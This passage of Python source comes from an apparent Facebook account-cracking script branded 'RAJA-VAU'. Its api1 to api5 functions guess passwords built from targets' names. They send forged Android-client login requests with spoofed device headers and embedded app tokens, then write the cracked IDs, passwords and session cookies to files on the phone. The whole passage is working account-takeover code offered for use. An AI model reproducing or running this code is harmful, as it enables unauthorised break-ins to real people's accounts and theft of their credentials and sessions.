                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120', 
                'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 
                'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print('\r\r\033[1;92m[RAJA-VAU✔] ' + uid + ' | ' + pw + ' |' + ashaa(uid) + '')
                open('/sdcard/RAJA-VAU/RAJA VAU-OLD-M3-OK.txt', 'a').write(uid + '|' + pw + '\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print('\r\r\033[1;92m[RAJA-VAU✔] ' + uid + ' | ' + pw + ' |' + ashaa(uid) + '')
                open('/sdcard/RAJA-VAU/RAJA VAU-OLD-M3-OK.txt', 'a').write(uid + '|' + pw + '\n')
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def api1(ids, names, passlist):
    global loop
    try:
        color = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;97m[RAJA-VAUXD-M1\033[1;97m]\033[1;97m-\033[1;97m[{color}{loop}\033[1;97m]\033[1;97m-\033[1;97m[\033[1;92mOK-:{len(oks)}\033[1;97m]')
        sys.stdout.flush()
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = ('256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',)
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            en = random.choice(['en_US', 'en_GB'])
            X620 = random.choice([
                'X697X663', 'X663B', 'PR652B', 'X267', 'X5010', 'X521', 'X5514D', 'X5515', 
                'X5515F', 'X559', 'X559C', 'X559F', 'X571', 'X572', 'X573', 'X573B', 'X601', 
                'X603', 'X604', 'X604B', 'X605', 'X606', 'X606B', 'X606C', 'X606D', 'X608', 
                'X609', 'X610', 'X610B', 'X612', 'X612B', 'X620', 'X620B', 'X622', 'X623', 
                'X623B', 'X624', 'X624B', 'X625', 'X625B', 'X625D', 'X626', 'X626B', 'X627V', 
                'X650', 'X650B', 'X650C', 'X650D', 'X652', 'X652A', 'X652B'
            ])
            ams = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
            network = random.choice(['Zong', 'null', 'Banglalink', 'Roshan', 'Marshmallow', 'Telekom China'])
            ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/Orca-Android;FBAV/296.0.0.17.137;FBBV/21810039;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/368298519;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-R910;FBSV/5;FBCA/armeabi-v7a:armeabi;]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = ('256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',)
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'[\"{xd}\"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join((random.choice(digits) for _ in range(2)))
            jazoest = li2 + j1
            __locale__ = {'en_US': 'US', 'en_GB': 'GB', 'es_ES': 'ES', 'fr_FR': 'FR', 'ar_SA': 'SA', 'bn_BD': 'BD', 'ja_JP': 'JP', 'de_DE': 'DE', 'pt_BR': 'BR'}
            country_locale = random.choice(list(__locale__.keys()))
            country_code = __locale__[country_locale]
            pax = random.choice(['PWD_FB4A', 'PWD_BROWSER'])
            data = {
                'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 
                'password': f'#{pax}:0:{int(time.time())}:{pas}', 'session_id': str(uuid.uuid4()), 
                'enroll_misauth': 'false', 'generate_analytics_claims': '1', 'credentials_type': 'password', 
                'source': 'login', 'error_detail_type': 'button_with_disabled', 'cpl': '1', 
                'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 
                'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }
            headers = {
                'Authorization': f'OAuth {accessToken}', 'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)), 
                'X-FB-Net-HNI': str(random.randint(900000, 999999)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
                'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': random.choice(['CELL.3G', 'WIFI', 'MOBILE.LTE', 'unknown']), 
                'User-Agent': window1(), 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print('\r\r\033[1;32m[RAJA-VAU✔] ' + ids + ' | ' + pas)
                get_coki = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
                compile_coki = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                coki = f'sb={compile_coki};{get_coki}'
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M1-COOKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M1-OK.txt', 'a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                os.system('espeak -a 300 \"HEY,  YOU,  GOT,  OK,  ID\"')
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print('\r\r\033[1;34m[RAJA-VAU-2F💥] ' + ids + ' | ' + pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                if 'y' in pcp:
                    print('\r\r\033[1;31m[RAJA-VAU-CP💥] ' + ids + ' | ' + pas + '\033[1;97m')
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M1-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
                else:
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M1-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        api1(ids, names, passlist)
    except Exception as e:
        return None
def api2(ids, names, passlist):
    global loop
    try:
        color = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;97m[RAJA-VAUXD-M2\033[1;97m]\033[1;97m-\033[1;97m[{color}{loop}\033[1;97m]\033[1;97m-\033[1;97m[\033[1;92mOK-:{len(oks)}\033[1;97m]')
        sys.stdout.flush()
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            en = random.choice(['en_US', 'en_GB'])
            X620 = random.choice([
                'X697X663', 'X663B', 'PR652B', 'X267', 'X5010', 'X521', 'X5514D', 'X5515', 
                'X5515F', 'X559', 'X559C', 'X559F', 'X571', 'X572', 'X573', 'X573B', 'X601', 
                'X603', 'X604', 'X604B', 'X605', 'X606', 'X606B', 'X606C', 'X606D', 'X608', 
                'X609', 'X610', 'X610B', 'X612', 'X612B', 'X620', 'X620B', 'X622', 'X623', 
                'X623B', 'X624', 'X624B', 'X625', 'X625B', 'X625D', 'X626', 'X626B', 'X627V', 
                'X650', 'X650B', 'X650C', 'X650D', 'X652', 'X652A', 'X652B'
            ])
            ams = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
            network = random.choice(['Zong', 'null', 'Marshmallow', 'Telekom China'])
            ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636690;FBDM/{density=2.0,width=720,height=1184};FBLC/es_ES;FBRV/208541728;FBCR/TELCEL;FBMF/ZENEK;FBBD/ZENEK;FBPN/com.facebook.katana;FBDV/Libelula Z6001;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'[\"{xd}\"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join((random.choice(digits) for _ in range(2)))
            jazoest = li2 + j1
            __locale__ = {'en_US': 'US', 'en_GB': 'GB', 'es_ES': 'ES', 'fr_FR': 'FR', 'ar_SA': 'SA', 'bn_BD': 'BD', 'ja_JP': 'JP', 'de_DE': 'DE', 'pt_BR': 'BR'}
            country_locale = random.choice(list(__locale__.keys()))
            country_code = __locale__[country_locale]
            pax = random.choice(['PWD_FB4A', 'PWD_BROWSER'])
            data = {
                'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 
                'password': f'#{pax}:0:{int(time.time())}:{pas}', 'session_id': str(uuid.uuid4()), 
                'enroll_misauth': 'false', 'generate_analytics_claims': '1', 'credentials_type': 'password', 
                'source': 'login', 'error_detail_type': 'button_with_disabled', 'cpl': '1', 
                'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 
                'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }
            headers = {
                'Authorization': f'OAuth {accessToken}', 'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)), 
                'X-FB-Net-HNI': str(random.randint(900000, 999999)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
                'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': random.choice(['CELL.3G', 'WIFI', 'MOBILE.LTE', 'unknown']), 
                'User-Agent': _____UpDaTe_S1_____(), 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print('\r\r\033[1;32m[RAJA-VAU✔] ' + ids + ' | ' + pas)
                q = po
                powerERROR = ';'.join((i['name'] + '=' + i['value'] for i in q['session_cookies']))
                ERRORramxan = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookie = f'sb={ERRORramxan};{powerERROR}'
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M2-COOKIE.txt', 'a').write(ids + '|' + pas + ' | ' + cookie + '\n')
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M2-OK.txt', 'a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print('\r\r\033[1;34m[RAJA-VAU-2F💥] ' + ids + ' | ' + pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                if 'y' in pcp:
                    print('\r\r\033[1;31m[RAJA-VAU-CP💥] ' + ids + ' | ' + pas + '\033[1;97m')
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M2-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
                else:
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M2-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        api2(ids, names, passlist)
    except Exception as e:
        return None

def api3(ids, names, passlist):
    global loop
    try:
        color = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;97m[RAJA-VAUXD-M3\033[1;97m]\033[1;97m-\033[1;97m[{color}{loop}\033[1;97m]\033[1;97m-\033[1;97m[\033[1;92mOK-:{len(oks)}\033[1;97m]')
        sys.stdout.flush()
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            en = random.choice(['en_US', 'en_GB'])
            X620 = random.choice([
                'X697X663', 'X663B', 'PR652B', 'X267', 'X5010', 'X521', 'X5514D', 'X5515', 
                'X5515F', 'X559', 'X559C', 'X559F', 'X571', 'X572', 'X573', 'X573B', 'X601', 
                'X603', 'X604', 'X604B', 'X605', 'X606', 'X606B', 'X606C', 'X606D', 'X608', 
                'X609', 'X610', 'X610B', 'X612', 'X612B', 'X620', 'X620B', 'X622', 'X623', 
                'X623B', 'X624', 'X624B', 'X625', 'X625B', 'X625D', 'X626', 'X626B', 'X627V', 
                'X650', 'X650B', 'X650C', 'X650D', 'X652', 'X652A', 'X652B'
            ])
            ams = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
            network = random.choice(['Zong', 'null', 'Banglalink', 'Roshan', 'Marshmallow', 'Telekom China'])
            ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/250.0.0.11.114;FBBV/28055324;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-P905V;FBSV/11;FBCA/armeabi-v7a:armeabi;]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'[\"{xd}\"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join((random.choice(digits) for _ in range(2)))
            jazoest = li2 + j1
            __locale__ = {'en_US': 'US', 'en_GB': 'GB', 'es_ES': 'ES', 'fr_FR': 'FR', 'ar_SA': 'SA', 'bn_BD': 'BD', 'ja_JP': 'JP', 'de_DE': 'DE', 'pt_BR': 'BR'}
            country_locale = random.choice(list(__locale__.keys()))
            country_code = __locale__[country_locale]
            pax = random.choice(['PWD_FB4A', 'PWD_BROWSER'])
            data = {
                'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 
                'password': f'#{pax}:0:{int(time.time())}:{pas}', 'session_id': str(uuid.uuid4()), 
                'enroll_misauth': 'false', 'generate_analytics_claims': '1', 'credentials_type': 'password', 
                'source': 'login', 'error_detail_type': 'button_with_disabled', 'cpl': '1', 
                'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 
                'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }
            headers = {
                'Authorization': f'OAuth {accessToken}', 'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)), 
                'X-FB-Net-HNI': str(random.randint(900000, 999999)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
                'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': random.choice(['CELL.3G', 'WIFI', 'MOBILE.LTE', 'unknown']), 
                'User-Agent': _____UpDaTe_S2_____(), 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print('\r\r\033[1;32m [RAJA-VAU✔] ' + ids + ' | ' + pas)
                get_coki = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
                compile_coki = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                coki = f'sb={compile_coki};{get_coki}'
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M3-COOKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M3-OK.txt', 'a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                os.system('espeak -a 300 \"HEY,  YOU,  GOT,  OK,  ID\"')
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print('\r\r\033[1;34m[RAJA-VAU-2F💥] ' + ids + ' | ' + pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                if 'y' in pcp:
                    print('\r\r\033[1;31m[RAJA-VAU-CP💥] ' + ids + ' | ' + pas + '\033[1;97m')
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M3-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
                else:
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M3-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        api3(ids, names, passlist)
    except Exception as e:
        return None
def api4(ids, names, passlist):
    global loop
    try:
        color = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;97m[RAJA-VAUXD-M4\033[1;97m]\033[1;97m-\033[1;97m[{color}{loop}\033[1;97m]\033[1;97m-\033[1;97m[\033[1;92mOK-:{len(oks)}\033[1;97m]')
        sys.stdout.flush()
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895'
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            en = random.choice(['en_US', 'en_GB'])
            X620 = random.choice([
                'X697X663', 'X663B', 'PR652B', 'X267', 'X5010', 'X521', 'X5514D', 'X5515', 
                'X5515F', 'X559', 'X559C', 'X559F', 'X571', 'X572', 'X573', 'X573B', 'X601', 
                'X603', 'X604', 'X604B', 'X605', 'X606', 'X606B', 'X606C', 'X606D', 'X608', 
                'X609', 'X610', 'X610B', 'X612', 'X612B', 'X620', 'X620B', 'X622', 'X623', 
                'X623B', 'X624', 'X624B', 'X625', 'X625B', 'X625D', 'X626', 'X626B', 'X627V', 
                'X650', 'X650B', 'X650C', 'X650D', 'X652', 'X652A', 'X652B'
            ])
            ams = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
            network = random.choice(['Zong', 'null', 'Banglalink', 'Roshan', 'Marshmallow', 'Telekom China'])
            ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/Orca-Android;FBAV/296.0.0.17.137;FBBV/21810039;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/368298519;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-R910;FBSV/5;FBCA/armeabi-v7a:armeabi;]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'[\"{xd}\"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join((random.choice(digits) for _ in range(2)))
            jazoest = li2 + j1
            __locale__ = {'en_US': 'US', 'en_GB': 'GB', 'es_ES': 'ES', 'fr_FR': 'FR', 'ar_SA': 'SA', 'bn_BD': 'BD', 'ja_JP': 'JP', 'de_DE': 'DE', 'pt_BR': 'BR'}
            country_locale = random.choice(list(__locale__.keys()))
            country_code = __locale__[country_locale]
            pax = random.choice(['PWD_FB4A', 'PWD_BROWSER'])
            data = {
                'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 
                'password': f'#{pax}:0:{int(time.time())}:{pas}', 'session_id': str(uuid.uuid4()), 
                'enroll_misauth': 'false', 'generate_analytics_claims': '1', 'credentials_type': 'password', 
                'source': 'login', 'error_detail_type': 'button_with_disabled', 'cpl': '1', 
                'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 
                'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }
            headers = {
                'Authorization': f'OAuth {accessToken}', 'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)), 
                'X-FB-Net-HNI': str(random.randint(900000, 999999)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
                'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': random.choice(['CELL.3G', 'WIFI', 'MOBILE.LTE', 'unknown']), 
                'User-Agent': _____UpDaTe_S1_____(), 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://graph.facebook.com/auth/login'
            twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print('\r\r\033[1;32m[RAJA-VAU✔] ' + ids + ' | ' + pas)
                get_coki = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
                compile_coki = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                coki = f'sb={compile_coki};{get_coki}'
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M4-COOKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
                open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M4-OK.txt', 'a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                os.system('espeak -a 300 \"HEY,  YOU,  GOT,  OK,  ID\"')
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print('\r\r\033[1;34m[RAJA-VAU-2F💥] ' + ids + ' | ' + pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                if 'y' in pcp:
                    print('\r\r\033[1;31m[RAJA-VAU-CP💥] ' + ids + ' | ' + pas + '\033[1;97m')
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M4-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
                else:
                    open('/sdcard/RAJA-VAU/RAJA VAU-FILE-M4-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        api4(ids, names, passlist)
    except Exception as e:
        return None

def api5(ids, names, passlist):
    global loop
    try:
        color = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;97m[RAJA-VAUXD-M5\033[1;97m]\033[1;97m-\033[1;97m[{color}{loop}\033[1;97m]\033[1;97m-\033[1;97m[\033[1;92mOK-:{len(oks)}\033[1;97m]')
        sys.stdout.flush()
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            en = random.choice(['en_US', 'en_GB'])
            X620 = random.choice([
                'X697X663', 'X663B', 'PR652B', 'X267', 'X5010', 'X521', 'X5514D', 'X5515', 
                'X5515F', 'X559', 'X559C', 'X559F', 'X571', 'X572', 'X573', 'X573B', 'X601', 
                'X603', 'X604', 'X604B', 'X605', 'X606', 'X606B', 'X606C', 'X606D', 'X608', 
                'X609', 'X610', 'X610B', 'X612', 'X612B', 'X620', 'X620B', 'X622', 'X623', 
                'X623B', 'X624', 'X624B', 'X625', 'X625B', 'X625D', 'X626', 'X626B', 'X627V', 
                'X650', 'X650B', 'X650C', 'X650D', 'X652', 'X652A', 'X652B'
            ])
            ams = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
            network = random.choice(['Zong', 'null', 'Marshmallow', 'Telekom China'])
            ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636690;FBDM/{density=2.0,width=720,height=1184};FBLC/es_ES;FBRV/208541728;FBCR/TELCEL;FBMF/ZENEK;FBBD/ZENEK;FBPN/com.facebook.katana;FBDV/Libelula Z6001;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'[\"{xd}\"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join((random.choice(digits) for _ in range(2)))
            jazoest = li2 + j1
            __locale__ = {'en_US': 'US', 'en_GB': 'GB', 'es_ES': 'ES', 'fr_FR': 'FR', 'ar_SA': 'SA', 'bn_BD': 'BD', 'ja_JP': 'JP', 'de_DE': 'DE', 'pt_BR': 'BR'}
            country_locale = random.choice(list(__locale__.keys()))
            country_code = __locale__[country_locale]
            pax = random.choice(['PWD_FB4A', 'PWD_BROWSER'])
            data = {
                'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 
                'password': f'#{pax}:0:{int(time.time())}:{pas}', 'session_id': str(uuid.uuid4()), 
                'enroll_misauth': 'false', 'generate_analytics_claims': '1', 'credentials_type': 'password', 
